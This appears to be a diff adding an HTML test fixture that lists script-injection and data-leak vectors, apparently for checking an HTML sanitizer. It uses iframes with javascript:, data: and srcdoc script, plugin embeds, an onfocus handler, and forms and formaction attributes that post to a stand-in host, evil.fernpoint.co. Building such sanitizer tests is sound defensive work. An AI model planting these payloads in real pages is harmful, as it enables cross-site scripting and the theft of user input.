@@ -1,0 +1,23 @@
+<p>Frames, plugins and forms.</p>
+<iframe src="https://evil.fernpoint.co/f/iframe.html" width="1" height="1"></iframe>
+<iframe srcdoc="<script>top.__pwned='srcdoc-iframe'</script><img src='https://evil.fernpoint.co/f/srcdoc-iframe.gif'>"></iframe>
+<iframe src="javascript:top.__pwned='iframe-js'"></iframe>
+<iframe src="data:text/html,<script>top.__pwned='iframe-data'</script>"></iframe>
+<frameset><frame src="https://evil.fernpoint.co/f/frame.html"></frameset>
+<object data="https://evil.fernpoint.co/f/object.swf" type="application/x-shockwave-flash"><param name="movie" value="https://evil.fernpoint.co/f/param.swf"></object>
+<object data="https://evil.fernpoint.co/f/object.html" type="text/html"></object>
+<embed src="https://evil.fernpoint.co/f/embed.swf" type="application/x-shockwave-flash">
+<embed src="https://evil.fernpoint.co/f/embed.html" type="text/html">
+<applet code="X.class" codebase="https://evil.fernpoint.co/f/"></applet>
+<form id="f" action="https://evil.fernpoint.co/f/form-action" method="post">
+  <input name="q" value="1" autofocus onfocus="top.__pwned='input-focus'">
+  <input type="image" src="https://evil.fernpoint.co/f/input-image.png" alt="go">
+  <button formaction="https://evil.fernpoint.co/f/button-formaction" type="submit">Go</button>
+  <textarea name="t">text</textarea>
+  <select name="s"><option>1</option></select>
+</form>
+<form action="javascript:top.__pwned='form-js'"><button type="submit">Go</button></form>
+<form method="dialog"><button>Close</button></form>
+<img src="https://pixel.fernpoint.co/f/img-with-form-attr.gif" form="f" alt="">
+<input form="f" type="submit" formaction="https://evil.fernpoint.co/f/input-formaction">
+<keygen name="k"><isindex action="https://evil.fernpoint.co/f/isindex">
